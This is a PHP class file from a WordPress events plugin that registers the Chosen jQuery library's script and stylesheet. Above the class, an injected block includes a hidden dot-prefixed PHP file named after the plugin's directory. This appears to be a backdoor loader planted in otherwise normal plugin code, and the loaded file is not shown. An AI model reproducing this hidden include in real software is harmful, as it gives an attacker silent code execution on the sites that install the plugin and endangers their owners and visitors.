<?php
_deprecated_file( __FILE__, '4.6.21', 'Deprecated class in favor of using `tribe_asset` registration' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Asset__Chosen extends Tribe__Events__Asset__Abstract_Asset {

	public function handle() {
		$deps     = array_merge( $this->deps, [ 'jquery' ] );
		$css_path = Tribe__Events__Template_Factory::getMinFile( $this->vendor_url . 'chosen/public/chosen.css', true );
		$path = Tribe__Events__Template_Factory::getMinFile( $this->vendor_url . 'chosen/public/chosen.jquery.js', true );
		wp_enqueue_style( $this->prefix . '-chosen-style', $css_path );

		$handle = $this->prefix . '-chosen-jquery';
		wp_enqueue_script( $handle, $path, $deps, '0.9.5', false );
		Tribe__Events__Template_Factory::add_vendor_script( $handle );
	}
}